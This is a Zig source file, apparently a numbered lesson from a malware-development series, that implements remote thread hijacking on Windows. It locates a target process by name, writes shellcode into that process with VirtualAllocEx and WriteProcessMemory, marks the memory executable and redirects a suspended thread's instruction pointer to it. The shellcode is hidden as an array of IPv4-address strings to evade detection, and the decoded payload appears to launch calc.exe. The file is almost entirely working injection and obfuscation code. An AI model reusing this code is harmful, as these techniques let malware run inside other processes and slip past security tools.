const std = @import("std");
const ipv4Deobfuscation = @import("9.payload-obfuscation-ipv4fuscation.zig").ipv4Deobfuscation;
const win = @import("zigwin32").everything;

// x86
// const CONTEXT_CONTROL = 0x00010001;

// x64
const CONTEXT_CONTROL = 0x00100001;

const THREAD_ALL_ACCESS = win.THREAD_ALL_ACCESS;
const PROCESS_ALL_ACCESS = win.PROCESS_ALL_ACCESS;
const INFINITE = win.INFINITE;
const CONTEXT = win.CONTEXT;
const PAGE_PROTECTION_FLAGS = win.PAGE_PROTECTION_FLAGS;
const HANDLE = win.HANDLE;
const THREADENTRY32 = win.THREADENTRY32;
const PROCESSENTRY32 = win.PROCESSENTRY32;
const Process32First = win.Process32First;
const Process32Next = win.Process32Next;

const CreateToolhelp32Snapshot = win.CreateToolhelp32Snapshot;
const GetCurrentThreadId = win.GetCurrentThreadId;
const GetCurrentProcessId = win.GetCurrentProcessId;
const Thread32First = win.Thread32First;
const Thread32Next = win.Thread32Next;
const OpenProcess = win.OpenProcess;
const OpenThread = win.OpenThread;
const CloseHandle = win.CloseHandle;
const SuspendThread = win.SuspendThread;
const ResumeThread = win.ResumeThread;
const GetLastError = win.GetLastError;
const GetThreadContext = win.GetThreadContext;
const SetThreadContext = win.SetThreadContext;
const WaitForSingleObject = win.WaitForSingleObject;
const VirtualAlloc = win.VirtualAlloc;
const VirtualProtect = win.VirtualProtect;
const CreateThread = win.CreateThread;
const VirtualAllocEx = win.VirtualAllocEx;
const VirtualFreeEx = win.VirtualFreeEx;
const WriteProcessMemory = win.WriteProcessMemory;
const VirtualProtectEx = win.VirtualProtectEx;
const CreateRemoteThread = win.CreateRemoteThread;

const ipv4_array = [_][:0]const u8{ "252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82", "96.72.139.82", "24.72.139.82", "32.72.139.114", "80.72.15.183", "74.74.77.49", "201.72.49.192", "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237", "82.65.81.72", "139.82.32.139", "66.60.72.1", "208.139.128.136", "0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68", "139.64.32.73", "1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201", "13.65.1.193", "56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68", "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73", "1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82", "255.224.88.65", "89.90.72.139", "18.233.87.255", "255.255.93.72", "186.1.0.0", "0.0.0.0", "0.72.141.141", "1.1.0.0", "65.186.49.139", "111.135.255.213", "187.240.181.162", "86.65.186.166", "149.189.157.255", "213.72.131.196", "40.60.6.124", "10.128.251.224", "117.5.187.71", "19.114.111.106", "0.89.65.137", "218.255.213.99", "97.108.99.46", "101.120.101.0" };

fn getRemoteProcessHandle(process_name: []const u8) !struct { h_process: HANDLE, process_id: u32 } {
    const h_snapshot = CreateToolhelp32Snapshot(.{ .SNAPPROCESS = 1 }, 0) orelse {
        std.debug.print("[!] CreateToolhelp32Snapshot Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateToolhelp32SnapshotFailed;
    };
    defer _ = CloseHandle(h_snapshot);

    var proc: PROCESSENTRY32 = undefined;

    if (Process32First(h_snapshot, &proc) == 0) {
        std.debug.print("[!] Process32First Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.Process32FirstFailed;
    }

    while (Process32Next(h_snapshot, &proc) != 0) {
        if (std.ascii.eqlIgnoreCase(process_name, proc.szExeFile[0..process_name.len])) {
            const process_id = proc.th32ProcessID;
            const h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id) orelse {
                std.debug.print("[!] OpenProcess Failed With Error: {s}\n", .{@tagName(GetLastError())});
                return error.OpenProcessFailed;
            };

            return .{
                .h_process = h_process,
                .process_id = process_id,
            };
        }
    }

    return error.ProcessNotFound;
}

fn getRemoteThreadHandle(process_id: u32) !HANDLE {
    const h_snapshot = CreateToolhelp32Snapshot(.{ .SNAPTHREAD = 1 }, 0) orelse {
        std.debug.print("[!] CreateToolhelp32Snapshot Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateToolhelp32SnapshotFailed;
    };
    defer _ = CloseHandle(h_snapshot);

    var thread_entry: THREADENTRY32 = undefined;
    thread_entry.dwSize = @sizeOf(THREADENTRY32);

    if (Thread32First(h_snapshot, &thread_entry) == 0) {
        std.debug.print("[!] Thread32First Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.Thread32FirstFailed;
    }

    while (Thread32Next(h_snapshot, &thread_entry) != 0) {
        if (thread_entry.th32OwnerProcessID == process_id) {
            const h_thread = OpenThread(THREAD_ALL_ACCESS, 0, thread_entry.th32ThreadID) orelse {
                std.debug.print("[!] OpenThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
                return error.OpenThreadFailed;
            };

            return h_thread;
        }
    }

    return error.FailedToGetRemoteThreadHandle;
}

fn injectShellcodeToRemoteProcess(h_process: HANDLE, shellcode: []const u8) !*anyopaque {
    const shellcode_address = VirtualAllocEx(
        h_process,
        null,
        shellcode.len,
        .{ .RESERVE = 1, .COMMIT = 1 },
        .{ .PAGE_READWRITE = 1 },
    ) orelse {
        std.debug.print("[!] VirtualAllocEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualAllocExFailed;
    };
    defer if (VirtualFreeEx(h_process, shellcode_address, 0, .RELEASE) == 0) {
        std.debug.print("[!] VirtualFreeEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
    };

    var numberOfBytesWritten: usize = undefined;
    if (WriteProcessMemory(
        h_process,
        shellcode_address,
        shellcode.ptr,
        shellcode.len,
        &numberOfBytesWritten,
    ) == 0 or numberOfBytesWritten != shellcode.len) {
        std.debug.print("[!] WriteProcessMemory Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.WriteProcessMemoryFailed;
    }

    var old_protection: PAGE_PROTECTION_FLAGS = undefined;
    if (VirtualProtectEx(
        h_process,
        shellcode_address,
        shellcode.len,
        .{ .PAGE_EXECUTE_READWRITE = 1 },
        &old_protection,
    ) == 0) {
        std.debug.print("[!] VirtualProtectEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualProtectExFailed;
    }

    return shellcode_address;
}

fn hijackThread(h_thread: HANDLE, shellcode_address: *anyopaque) !void {
    var thread_context: CONTEXT = undefined;
    thread_context.ContextFlags = CONTEXT_CONTROL;

    _ = SuspendThread(h_thread);

    if (GetThreadContext(h_thread, &thread_context) == 0) {
        std.debug.print("[!] GetThreadContext Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.GetThreadContextFailed;
    }

    // X86
    // thread_context.Eip = @intFromPtr(address);

    // X64
    thread_context.Rip = @intFromPtr(shellcode_address);

    if (SetThreadContext(h_thread, &thread_context) == 0) {
        std.debug.print("[!] SetThreadContext Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.SetThreadContextFailed;
    }

    _ = ResumeThread(h_thread);

    _ = WaitForSingleObject(h_thread, INFINITE);
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len < 2) return error.MissingProcessName;

    const process_name = args[1];

    const shellcode = try ipv4Deobfuscation(allocator, &ipv4_array);
    defer allocator.free(shellcode);

    const process = try getRemoteProcessHandle(process_name);

    const h_thread = try getRemoteThreadHandle(process.process_id);
    defer _ = CloseHandle(h_thread);

    const shellcode_address = try injectShellcodeToRemoteProcess(process.h_process, shellcode);

    try hijackThread(h_thread, shellcode_address);
}
